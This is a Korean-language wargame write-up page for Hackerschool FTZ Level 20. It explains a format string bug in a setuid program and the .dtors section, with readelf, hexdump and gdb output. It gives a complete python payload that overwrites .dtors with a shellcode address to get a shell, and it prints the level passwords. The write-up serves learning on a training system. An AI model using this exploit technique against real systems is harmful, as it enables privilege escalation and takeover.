@@ -1,0 +1,235 @@
+<!DOCTYPE html> <html lang="en" dir="auto"> <head><meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=no"> <meta name="description" content="Level 20 id : level20 password : we are just regular guys hint를 보면 attackme의 소스코드가 나온다. attackme에 setuid가 걸려있으니 얘를 조져보자. #include &amp;lt;stdio.h&a..."> <meta name="revised" content="931f20f4c8a5c6f979ef4a6626f65e648ca0285e"> <meta name="author" content="Mysigyeong"> <meta name="generator" content="jekyll-rtd-theme v2.0.10"><meta name="theme-color" content="#2980b9"> <title>Level 20 · 심심하다</title> <meta name="twitter:title" content="Level 20 · 심심하다"> <meta name="twitter:description" content="Level 20 id : level20 password : we are just regular guys hint를 보면 attackme의 소스코드가 나온다. attackme에 setuid가 걸려있으니 얘를 조져보자. #include &amp;lt;stdio.h&a..."> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@Mysigyeong"> <meta name="twitter:url" content="http://localhost:4000/hacker_school/ftz/level20.html"> <meta name="twitter:creator" content="@jekyll-rtd-theme v2.0.10"> <meta property="og:title" content="Level 20 · 심심하다"> <meta property="og:description" content="Level 20 id : level20 password : we are just regular guys hint를 보면 attackme의 소스코드가 나온다. attackme에 setuid가 걸려있으니 얘를 조져보자. #include &amp;lt;stdio.h&a..."> <meta property="og:locale" content="en"> <meta property="og:url" content="http://localhost:4000/hacker_school/ftz/level20.html"> <meta property="og:type" content="article"> <meta property="article:author" content="Mysigyeong"> <meta property="article:published_time" content="2021-01-10T21:09:04+09:00"> <meta property="article:modified_time" content="2021-01-10T21:09:04+09:00"> <script type="application/ld+json"> { "@context": "https://schema.org", "@type": "Article", "mainEntityOfPage": { "@type": "WebPage", "@id": "http://localhost:4000/hacker_school/ftz/level20.html" }, "headline": "Level 20 · 심심하다", "image": [], "author": { "@type": "Person", "name": "Mysigyeong" }, "datePublished": "2021-01-10T21:09:04+09:00", "dateModified": "2021-01-10T21:09:04+09:00", "publisher": { "@type": "", "name": "Mysigyeong", "logo": { "@type": "ImageObject", "url": "" } }, "description": "Level 20 id : level20 password : we are just regular guys hint를 보면 attackme의 소스코드가 나온다. attackme에 setuid가 걸려있으니 얘를 조져보자. #include &amp;lt;stdio.h&a..." } </script> <link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="prev" href="http://localhost:4000/hacker_school/ftz/level19.html"><link rel="canonical" href="http://localhost:4000/hacker_school/ftz/level20.html"><link rel="icon" type="image/svg+xml" href="/assets/images/favicon.svg"><link rel="icon" type="image/png" href="/assets/images/favicon-16x16.png" sizes="16x16"> <link rel="icon" type="image/png" href="/assets/images/favicon-32x32.png" sizes="32x32"> <link rel="icon" type="image/png" href="/assets/images/favicon-96x96.png" sizes="96x96"><link rel="mask-icon" href="/assets/images/favicon.svg" color="#2980b9"><link rel="apple-touch-icon" href="/assets/images/apple-touch-icon-300x300.jpg"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/rundocs/jekyll-rtd-theme@2.0.10/assets/css/theme.min.css"><script> window.ui = { title: "심심하다", baseurl: "", i18n: { search_results: "Search Results", search_results_found: "Search finished, found # page(s) matching the search query.", search_results_not_found: "Your search did not match any documents, please make sure that all characters are spelled correctly!" } }; </script> </head> <body class="container"><div class="sidebar-wrap overflow-hidden"> <div class="sidebar height-full overflow-y-scroll overflow-x-hidden"> <div class="header d-flex flex-column p-3 text-center"> <div class="title pb-1"> <a class="h4 no-underline py-1 px-2 rounded-1" href="/" title="나보려고 만든 블로그"> <i class="fa fa-home"></i> 심심하다 </a> </div> <span class="version"></span> <form class="search pt-2" action="/search.html" method="get" autocomplete="off"> <input class="form-control input-block input-sm" type="text" name="q" placeholder="Search docs..."> </form> </div> <div class="toctree py-2" data-spy="affix" role="navigation" aria-label="main navigation"> <ul> </ul> <a class="caption d-block text-uppercase no-wrap px-2 py-0" href="/hacker_school/"> Hacker school </a><ul> <li class="toc level-1"> <a class="d-flex flex-items-baseline" href="/hacker_school/ftz/"> Free Training Zone </a><ul> <li class="toc level-2 " data-sort="1" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level1.html">1. Level 1</a> </li> <li class="toc level-2 " data-sort="2" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level2.html">2. Level 2</a> </li> <li class="toc level-2 " data-sort="3" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level3.html">3. Level 3</a> </li> <li class="toc level-2 " data-sort="4" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level4.html">4. Level 4</a> </li> <li class="toc level-2 " data-sort="5" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level5.html">5. Level 5</a> </li> <li class="toc level-2 " data-sort="6" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level6.html">6. Level 6</a> </li> <li class="toc level-2 " data-sort="7" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level7.html">7. Level 7</a> </li> <li class="toc level-2 " data-sort="8" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level8.html">8. Level 8</a> </li> <li class="toc level-2 " data-sort="9" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level9.html">9. Level 9</a> </li> <li class="toc level-2 " data-sort="10" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level10.html">10. Level 10</a> </li> <li class="toc level-2 " data-sort="11" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level11.html">11. Level 11</a> </li> <li class="toc level-2 " data-sort="12" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level12.html">12. Level 12</a> </li> <li class="toc level-2 " data-sort="13" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level13.html">13. Level 13</a> </li> <li class="toc level-2 " data-sort="14" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level14.html">14. Level 14</a> </li> <li class="toc level-2 " data-sort="15" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level15.html">15. Level 15</a> </li> <li class="toc level-2 " data-sort="16" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level16.html">16. Level 16</a> </li> <li class="toc level-2 " data-sort="17" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level17.html">17. Level 17</a> </li> <li class="toc level-2 " data-sort="18" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level18.html">18. Level 18</a> </li> <li class="toc level-2 " data-sort="19" data-level="2"> <a class="d-flex flex-items-baseline " href="/hacker_school/ftz/level19.html">19. Level 19</a> </li> <li class="toc level-2 current" data-sort="20" data-level="2"> <a class="d-flex flex-items-baseline current" href="/hacker_school/ftz/level20.html">20. Level 20</a> </li></ul> </li> <li class="toc level-1"> <a class="d-flex flex-items-baseline" href="/hacker_school/lob/"> The Lord Of The Bufferoverflow </a><ul> </ul> </li></ul> <a class="caption d-block text-uppercase no-wrap px-2 py-0" href="/pwnable.kr/"> pwnable.kr </a><ul> <li class="toc level-1"> <a class="d-flex flex-items-baseline" href="/pwnable.kr/toddler/"> Toddler’s Bottle </a><ul> <li class="toc level-2 " data-sort="1" data-level="2"> <a class="d-flex flex-items-baseline " href="/pwnable.kr/toddler/fd.html">1. fd</a> </li></ul> </li> <li class="toc level-1"> <a class="d-flex flex-items-baseline" href="/pwnable.kr/rookiss/"> Rookiss </a><ul> <li class="toc level-2 " data-sort="1" data-level="2"> <a class="d-flex flex-items-baseline " href="/pwnable.kr/rookiss/bf.html">1. brain fuck</a> </li></ul> </li></ul> </div> </div> </div> <div class="content-wrap"> <div class="header d-flex flex-justify-between p-2 hide-lg hide-xl" aria-label="top navigation"> <button id="toggle" aria-label="Toggle menu" class="btn-octicon p-2 m-0 text-white" type="button"> <i class="fa fa-bars"></i> </button> <div class="title flex-1 d-flex flex-justify-center"> <a class="h4 no-underline py-1 px-2 rounded-1" href="/">심심하다</a> </div> </div> <div class="content p-3 p-sm-5"> <div class="navigation-top d-flex flex-justify-between"> <ul class="breadcrumb" role="navigation" aria-label="breadcrumbs navigation"> <li class="breadcrumb-item"> <a class="no-underline" href="/" title="/"> <i class="fa fa-home"></i> </a> </li><li class="breadcrumb-item" ><a href="/hacker_school/">hacker_school</a></li><li class="breadcrumb-item" ><a href="/hacker_school/ftz/">ftz</a></li><li class="breadcrumb-item" aria-current="page">level20.md</li></ul> <a class="edit" href="https://github.com/Mysigyeong/Mysigyeong.github.io/edit/gh-pages/hacker_school/ftz/level20.md" title="Edit on GitHub" rel="noreferrer" target="_blank"> <i class="fa fa-edit"></i> </a> </div> <hr> <div role="main" itemscope="itemscope" itemtype="https://schema.org/Article"> <div class="markdown-body" itemprop="articleBody"> <h1 id="level-20">Level 20</h1><div class="toasts note mb-4">
+    <div class="title px-2 py-1">
+        <i class="fa fa-info-circle"></i>
+        Note
+    </div>
+    <div class="content px-2 py-3">
+        <p>id : level20</p><p>password : we are just regular guys</p></div>
+</div>
+ <p>hint를 보면 attackme의 소스코드가 나온다.<br /> attackme에 setuid가 걸려있으니 얘를 조져보자.</p> <div class="language-c highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span><span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span> <span class="kt">char</span> <span class="n">bleh</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+  <span class="n">setreuid</span><span class="p">(</span><span class="mi">3101</span><span class="p">,</span><span class="mi">3101</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">bleh</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">bleh</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre>  </div></div> <p>사용자의 input을 그대로 printf에 때려 박는다. 여기에서 format string bug (FSB)가 발생한다.<br /> printf의 포맷중에서는 화면에 출력하는 것 뿐만아니라 메모리에 입력하는 포맷도 존재하기 때문에 이를 이용하여 임의의 공간에 임의의 값을 쓰는 것이 가능해진다.</p> <h2 id="format-string-bug">Format String Bug</h2> <p>printf에는 무려 지금까지 출력한 byte수를 저장할 수 있도록 %n(4byte값으로 저장), %hn(2byte), %hhn(1byte) 포맷이 존재한다.<br /> 따라서 %n과 같은 서식문자가 저장할 공간의 메모리 주소를 미리 알아내어 준비한 뒤 원하는 값을 해당 메모리 주소에 넣기 위해서 원하는 값만큼 %n 이전에 출력하면 된다.<br /><br /> 저장할 공간의 메모리 주소를 미리 알아내어 다른 부분은 훼손하지 않고 해당 부분만 변형할 수 있기 때문에 bof보다 더 영향력이 크면 컸지 작진 않다.<br /> 문제는 메모리 주소를 사전에 알아야 한다는 것인데, 해커스쿨 플랫폼 같은 경우에는 stack에 ASLR이 걸려있기 때문에 입력 buffer와의 간격을 계산하여 return address를 조졌던 bof와 달리, fsb로는 return address를 조지기는 어려워 보인다. 따라서 저장위치가 바뀌지 않으면서도 프로그램의 흐름을 바꿀 수 있는 부분을 이용해야한다.</p> <h3 id="constructor-destructor">Constructor, Destructor</h3> <p>C++에만 존재할 것 같았던 constructor와 destructor는 C에도 존재한다. 물론 object를 생성하고 소멸시키는데 사용되는 C++의 constructor, destructor와는 다르게 C에는 main함수가 호출되기 이전에 호출되는 constructor, main함수가 종료된 후에 호출되는 destructor가 존재한다. constructor와 destructor는 아래와 같이 만들 수 있다.</p><pre><code class="language-C">#include &lt;stdio.h&gt;
+
+/*
+ * constructor : __attribute__((constructor (priority)))
+ * destructor : __attribute__((destructor (priority)))
+ *
+ * priority값은 생략 가능.
+ */
+
+__attribute__((constructor (101))) void constructor_1(void)
+{
+        puts("constructor_1");
+}
+
+__attribute__((constructor (102))) void constructor_2(void)
+{
+        puts("constructor_2");
+}
+
+__attribute__((constructor (103))) void constructor_3(void)
+{
+        puts("constructor_3");
+}
+
+__attribute__((destructor (101))) void destructor_1(void)
+{
+        puts("destructor_1");
+}
+
+__attribute__((destructor (102))) void destructor_2(void)
+{
+        puts("destructor_2");
+}
+
+__attribute__((destructor (103))) void destructor_3(void)
+{
+        puts("destructor_3");
+}
+
+int main(int argc, char** argv)
+{
+        puts("main");
+        return 0;
+}
+</code></pre>  <p>위와 같이 직접 constructor와 destructor를 정의할 수 있다.<br /> constructor는 priority값이 낮은 것 먼저, destructor는 priority값이 높은 것 먼저 실행된다.<br /> priority값은 0~100사이는 reserved되어있기 때문에 101부터 사용해야한다.</p> <div class="language-bash highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./test
+constructor_1
+constructor_2
+constructor_3
+main
+destructor_3
+destructor_2
+destructor_1
+</code></pre>  </div></div><div class="toasts note mb-4">
+    <div class="title px-2 py-1">
+        <i class="fa fa-info-circle"></i>
+        Note
+    </div>
+    <div class="content px-2 py-3">
+        <p>hacker school에서 사용하는 gcc 버전은 3.2.2로 매우 옛날 것이기 때문에 constructor, destructor를 만들 때 priority를 줄 수 없다.</p><p>여러개의 constructor와 destructor를 만들었을 경우, <strong>constructor</strong>는 <strong>LIFO</strong>, <strong>destructor</strong>는 <strong>FIFO</strong>로 처리된다.</p><p>따라서 위 코드에서 priority값만 빼고 hacker school 플랫폼에서 다시 빌드하면 <strong>constructor 3, 2, 1, main, destructor 3, 2, 1</strong>순으로 실행된다.</p></div>
+</div>
+ <div class="language-bash highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level20@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-v</span>
+Reading specs from /usr/lib/gcc-lib/i386-redhat-linux/3.2.2/specs
+Configured with: ../configure <span class="nt">--prefix</span><span class="o">=</span>/usr <span class="nt">--mandir</span><span class="o">=</span>/usr/share/man <span class="nt">--infodir</span><span class="o">=</span>/usr/share/info <span class="nt">--enable-shared</span> <span class="nt">--enable-threads</span><span class="o">=</span>posix <span class="nt">--disable-checking</span> <span class="nt">--with-system-zlib</span> <span class="nt">--enable-__cxa_atexit</span> <span class="nt">--host</span><span class="o">=</span>i386-redhat-linux
+Thread model: posix
+gcc version 3.2.2 20030222 <span class="o">(</span>Red Hat Linux 3.2.2-5<span class="o">)</span>
+</code></pre>  </div></div> <p>왜 갑자기 constructor, destructor 얘기를 꺼내느냐, destructor는 main함수가 끝난 후에 실행이 되기 때문에 main함수에서 FSB를 이용하여 destructor함수를 가리키는 포인터 값을 조작하여 destructor 처리 루틴에서 프로그램의 흐름을 변조시킬 수 있기 때문이다.<br /> constructor, destructor함수들의 함수 포인터들은 .ctor, .dtor section에서 관리가 되며, 해당 section들의 위치는 <code class="language-plaintext highlighter-rouge notranslate">readelf</code>명령어를 통해 확인 가능하다.</p><pre>
+[level20@ftz tmp]$ readelf -S test
+There are 34 section headers, starting at offset 0x1e04:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        080480f4 0000f4 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08048108 000108 000020 00   A  0   0  4
+  [ 3] .hash             HASH            08048128 000128 000028 04   A  4   0  4
+  [ 4] .dynsym           DYNSYM          08048150 000150 000050 10   A  5   1  4
+  [ 5] .dynstr           STRTAB          080481a0 0001a0 00004a 00   A  0   0  1
+  [ 6] .gnu.version      VERSYM          080481ea 0001ea 00000a 02   A  4   0  2
+  [ 7] .gnu.version_r    VERNEED         080481f4 0001f4 000020 00   A  5   1  4
+  [ 8] .rel.dyn          REL             08048214 000214 000008 08   A  4   0  4
+  [ 9] .rel.plt          REL             0804821c 00021c 000010 08   A  4   b  4
+  [10] .init             PROGBITS        0804822c 00022c 000017 00  AX  0   0  4
+  [11] .plt              PROGBITS        08048244 000244 000030 04  AX  0   0  4
+  [12] .text             PROGBITS        08048274 000274 0001f0 00  AX  0   0  4
+  [13] .fini             PROGBITS        08048464 000464 00001b 00  AX  0   0  4
+  [14] .rodata           PROGBITS        08048480 000480 00005e 00   A  0   0  4
+  [15] .eh_frame         PROGBITS        080484e0 0004e0 000004 00   A  0   0  4
+  [16] .data             PROGBITS        080494e4 0004e4 00000c 00  WA  0   0  4
+  [17] .dynamic          DYNAMIC         080494f0 0004f0 0000c8 08  WA  5   0  4
+  <b>[18] .ctors            PROGBITS        080495b8 0005b8 000014 00  WA  0   0  4
+  [19] .dtors            PROGBITS        080495cc 0005cc 000014 00  WA  0   0  4 </b>
+  [20] .jcr              PROGBITS        080495e0 0005e0 000004 00  WA  0   0  4
+  [21] .got              PROGBITS        080495e4 0005e4 000018 04  WA  0   0  4
+  [22] .bss              NOBITS          080495fc 0005fc 000004 00  WA  0   0  4
+  [23] .comment          PROGBITS        00000000 0005fc 000132 00      0   0  1
+  [24] .debug_aranges    PROGBITS        00000000 000730 000078 00      0   0  8
+  [25] .debug_pubnames   PROGBITS        00000000 0007a8 000025 00      0   0  1
+  [26] .debug_info       PROGBITS        00000000 0007cd 000a84 00      0   0  1
+  [27] .debug_abbrev     PROGBITS        00000000 001251 000138 00      0   0  1
+  [28] .debug_line       PROGBITS        00000000 001389 00027c 00      0   0  1
+  [29] .debug_frame      PROGBITS        00000000 001608 000014 00      0   0  4
+  [30] .debug_str        PROGBITS        00000000 00161c 0006ba 01  MS  0   0  1
+  [31] .shstrtab         STRTAB          00000000 001cd6 00012b 00      0   0  1
+  [32] .symtab           SYMTAB          00000000 002354 000720 10     33  54  4
+  [33] .strtab           STRTAB          00000000 002a74 000440 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+</pre>  <p>그리고 hexdump를 통해 hex값으로 test를 dump한 후, .ctors부분과 .dtors부분을 확인했다. 위에 readelf를 통해 알 수 있듯이 둘은 붙어있었다.</p><pre>
+[level20@ftz tmp]$ hexdump test
+
+... (중략) ...
+
+# 5b8부터 5cc전까지 .ctor, 5cc부터는 .dtor
+00005b0 0000 0000 0000 0000 <b>ffff ffff 8324 0804
+00005c0 833c 0804 8354 0804 0000 0000 ffff ffff
+00005d0 836c 0804 8384 0804 839c 0804 0000 0000 </b>
+
+... (후략) ...
+</pre>  <p>그리고 constructor와 destructor를 호출하는 루틴은 각각 <code class="language-plaintext highlighter-rouge notranslate">__do_global_ctors_aux</code>와 <code class="language-plaintext highlighter-rouge notranslate">__do_global_dtors_aux</code>이다.<br /> ctor, dtor부분에 watchpoint를 건 후에 프로그램을 동작시키면 어느 함수에서 ctor, dtor영역을 접근하는지 쉽게 파악할 수 있다.</p><pre><code class="language-gdb">(gdb) disas __do_global_ctors_aux
+Dump of assembler code for function __do_global_ctors_aux:
+0x08048440 &lt;__do_global_ctors_aux+0&gt;:	push   %ebp
+0x08048441 &lt;__do_global_ctors_aux+1&gt;:	mov    %esp,%ebp
+0x08048443 &lt;__do_global_ctors_aux+3&gt;:	push   %ebx
+0x08048444 &lt;__do_global_ctors_aux+4&gt;:	push   %edx
+0x08048445 &lt;__do_global_ctors_aux+5&gt;:	mov    0x80495c4,%eax      &lt;-- constructor 함수 중 마지막 함수의 포인터가 위치하는 곳
+0x0804844a &lt;__do_global_ctors_aux+10&gt;:	cmp    $0xffffffff,%eax  &lt;-- 값이 0xffffffff인지 확인
+0x0804844d &lt;__do_global_ctors_aux+13&gt;:	mov    $0x80495c4,%ebx
+0x08048452 &lt;__do_global_ctors_aux+18&gt;:	je     0x8048460 &lt;__do_global_ctors_aux+32&gt;
+0x08048454 &lt;__do_global_ctors_aux+20&gt;:	sub    $0x4,%ebx         &lt;-- constructor 함수 포인터 4 감소
+0x08048457 &lt;__do_global_ctors_aux+23&gt;:	call   *%eax             &lt;-- constructor 함수 호출
+0x08048459 &lt;__do_global_ctors_aux+25&gt;:	mov    (%ebx),%eax
+0x0804845b &lt;__do_global_ctors_aux+27&gt;:	cmp    $0xffffffff,%eax
+0x0804845e &lt;__do_global_ctors_aux+30&gt;:	jne    0x8048454 &lt;__do_global_ctors_aux+20&gt;
+0x08048460 &lt;__do_global_ctors_aux+32&gt;:	pop    %eax
+0x08048461 &lt;__do_global_ctors_aux+33&gt;:	pop    %ebx
+0x08048462 &lt;__do_global_ctors_aux+34&gt;:	leave  
+0x08048463 &lt;__do_global_ctors_aux+35&gt;:	ret    
+End of assembler dump.
+
+(gdb) disas __do_global_dtors_aux
+Dump of assembler code for function __do_global_dtors_aux:
+0x080482bc &lt;__do_global_dtors_aux+0&gt;:	push   %ebp
+0x080482bd &lt;__do_global_dtors_aux+1&gt;:	mov    %esp,%ebp
+0x080482bf &lt;__do_global_dtors_aux+3&gt;:	sub    $0x8,%esp
+0x080482c2 &lt;__do_global_dtors_aux+6&gt;:	cmpb   $0x0,0x80495fc
+0x080482c9 &lt;__do_global_dtors_aux+13&gt;:	jne    0x80482f4 &lt;__do_global_dtors_aux+56&gt;
+0x080482cb &lt;__do_global_dtors_aux+15&gt;:	mov    0x80494ec,%eax &lt;-- 첫번째 destructor함수 포인터가 위치하는 곳의 주소값을 가지고 있음.
+0x080482d0 &lt;__do_global_dtors_aux+20&gt;:	mov    (%eax),%edx
+0x080482d2 &lt;__do_global_dtors_aux+22&gt;:	test   %edx,%edx      &lt;-- 0인지 확인
+0x080482d4 &lt;__do_global_dtors_aux+24&gt;:	je     0x80482ed &lt;__do_global_dtors_aux+49&gt;
+0x080482d6 &lt;__do_global_dtors_aux+26&gt;:	mov    %esi,%esi
+0x080482d8 &lt;__do_global_dtors_aux+28&gt;:	add    $0x4,%eax
+0x080482db &lt;__do_global_dtors_aux+31&gt;:	mov    %eax,0x80494ec &lt;-- 다음 destructor함수 포인터가 위치하는 곳으로 주소값 옮기고 저장.
+0x080482e0 &lt;__do_global_dtors_aux+36&gt;:	call   *%edx          &lt;-- destructor 함수 호출
+0x080482e2 &lt;__do_global_dtors_aux+38&gt;:	mov    0x80494ec,%eax
+0x080482e7 &lt;__do_global_dtors_aux+43&gt;:	mov    (%eax),%edx
+0x080482e9 &lt;__do_global_dtors_aux+45&gt;:	test   %edx,%edx
+0x080482eb &lt;__do_global_dtors_aux+47&gt;:	jne    0x80482d8 &lt;__do_global_dtors_aux+28&gt;
+0x080482ed &lt;__do_global_dtors_aux+49&gt;:	movb   $0x1,0x80495fc
+0x080482f4 &lt;__do_global_dtors_aux+56&gt;:	leave  
+0x080482f5 &lt;__do_global_dtors_aux+57&gt;:	ret    
+0x080482f6 &lt;__do_global_dtors_aux+58&gt;:	mov    %esi,%esi
+End of assembler dump.
+</code></pre>  <p>최종적으로 정리하면 아래 그림처럼 되겠다.</p> <p><img src="/picture/hacker_school/ftz/level20.png" width="1000" /></p> <p>참고로 .ctor .dtor사용하던 시절은 지났고 지금은(gcc 4.7 이후부터는) .ctors .dtors대신에 .init_array .fini_array를 사용한다고 한다.</p> <h3 id="attackme">attackme</h3> <p>.dtors의 주소값이 0x8049594이다. hackerschool 플랫폼은 stack에만 ASLR이 걸려있기 때문에 나머지는 고정적인 주소값을 가지게 된다.<br /> 따라서 0x8049598주소부터 4byte를 쉘코드의 주소로 조지면 된다.<br /> 쉘코드는 level17 때처럼 환경변수에 넣어놓고 사용했다.</p><pre>
+[level20@ftz level20]$ readelf -S attackme
+There are 34 section headers, starting at offset 0x1dcc:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+
+  ... (중략) ...
+
+  [19] .dtors            PROGBITS        08049594 000594 000008 00  WA  0   0  4
+
+  ... (중략) ...
+
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+</pre>  <p>우선 아래와 같이 입력값이 어디에 위치하게 되는지 알아보았다.</p> <div class="language-bash highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level20@ftz tmp]<span class="nv">$ </span>../attackme
+AAAABBBB %x %x %x %x %x
+AAAABBBB 4f 4212ecc0 4207a750 41414141 42424242
+</code></pre>  </div></div> <p>세번째 %x부터 입력값이 나오는 것을 확인할 수 있었다. 따라서 아래와 같이 구성한다면 .dtors section에 shellcode의 주소값을 넣을 수 있다.</p> <div class="language-plaintext highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code>target address 상위 2byte      4byte padding       target address 하위 2byte
+\x9a\x95\x04\x08               AAAA                \x98\x95\x04\x08
+
+0xbfff값을 입력하기 위해 0xbfffbyte(12+8+8+49123) 출력        target address 상위 2byte에 입력
+%8x%8x%49123x                                                 %hn
+
+0xff03값을 입력하기 위해 마저 16132byte 출력(0xbfff+16132=0xff03)       target address 하위 2byte에 입력
+%16132x                                                                 %hn
+</code></pre>  </div></div> <p>쉘코드의 주소값인 0xbfffff03이 4byte로 하면 음수가 되기 때문에 혹시 몰라서 2byte씩 나누어서 입력했다.</p> <div class="language-bash highlighter-rouge notranslate"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level20@ftz tmp]<span class="nv">$ </span>./shellcode
+0xbfffff03
+<span class="o">[</span>level20@ftz tmp]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s2">"print('</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AAAA</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08%8x%8x%49123x%hn%16132x%hn')"</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | ../attackme
+
+... <span class="o">(</span>쓰레기 출력값<span class="o">)</span> ...
+
+my-pass
+
+TERM environment variable not set.
+
+clear Password is <span class="s2">"i will come in a minute"</span><span class="nb">.</span>
+웹에서 등록하세요.
+
+<span class="k">*</span> 해커스쿨의 든 레벨을 통과하신 것을 축하드립니다.
+당신의 끈질긴 열정과 능숙한 솜씨에 찬사를 보냅니다.
+해커스쿨에서는 실력있 분들을 모아 연구소라는 그룹을 운영하고 있습니다.
+이 메시지를 보시는 분들 중에 연구소에 관심있으신 분은 자유로운 양식의
+가입 신청서를 admin@hackerschool.org로 보내주시기 바랍니다.
+</code></pre>  </div></div><div class="toasts tip mb-4">
+    <div class="title px-2 py-1">
+        <i class="fa fa-check-circle"></i>
+        Tip
+    </div>
+    <div class="content px-2 py-3">
+        <h2 id="알게-된-점">알게 된 점</h2><p>constructor, destructor</p><p>Format String Bug (FSB)</p></div>
+</div>
+ </div> </div> <div class="navigation-bottom d-flex flex-justify-between py-3" role="navigation" aria-label="footer navigation"> <div class="prev"><a href="/hacker_school/ftz/level19.html" class="btn" title="Level 19" accesskey="p" rel="prev"> <i class="fa fa-arrow-circle-left"></i> Previous </a></div> <div class="next"></div> </div><hr> <div class="copyright text-center text-gray" role="contentinfo"> <i class="fa fa-copyright"></i> <span class="time">2021,</span> <a class="text-gray" href="https://github.com/Mysigyeong" rel="noreferrer" target="_blank">Mysigyeong</a> Revision <a class="text-gray" href="https://github.com/Mysigyeong/Mysigyeong.github.io/commit/931f20f4c8a5c6f979ef4a6626f65e648ca0285e" title="931f20f4c8a5c6f979ef4a6626f65e648ca0285e" rel="noreferrer" target="_blank">931f20f</a> <br> <div class="generator"> Built with <a href="https://pages.github.com" rel="noreferrer" target="_blank" title="github-pages v209">GitHub Pages</a> using a <a href="https://github.com/rundocs/jekyll-rtd-theme" rel="noreferrer" target="_blank" title="jekyll-rtd-theme v2.0.10">theme</a> provided by <a href="https://rundocs.io" rel="noreferrer" target="_blank">RunDocs</a>. </div> </div> </div> </div> <div class="addons-wrap d-flex flex-column overflow-y-auto"> <div class="status d-flex flex-justify-between p-2"> <div class="title p-1"> <i class="fa fa-book"></i> 심심하다 </div> <div class="branch p-1"> <span class="name"> gh-pages </span> <i class="fa fa-caret-down"></i> </div> </div> <div class="addons d-flex flex-column height-full p-2 d-none"> <dl> <dt>GitHub</dt> <dd> <a href="https://github.com/Mysigyeong/Mysigyeong.github.io" title="Stars: "> <i class="fa fa-github"></i> Homepage </a> </dd> <dd> <a href="" title="Open issues: "> <i class="fa fa-question-circle-o"></i> Issues </a> </dd> <dd> <a href="https://github.com/Mysigyeong/Mysigyeong.github.io/zipball/gh-pages" title="Size: Kb"> <i class="fa fa-download"></i> Download </a> </dd> </dl> <hr> <div class="license f6 pb-2"> This <a href="/" title="심심하다">Software</a> is under the terms of <a href="https://github.com/Mysigyeong/Mysigyeong.github.io">The Unlicense</a>. </div> </div> </div> <script src="https://cdn.jsdelivr.net/gh/rundocs/jekyll-rtd-theme@2.0.10/assets/js/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/rundocs/jekyll-rtd-theme@2.0.10/assets/js/theme.min.js"></script> </body> </html>
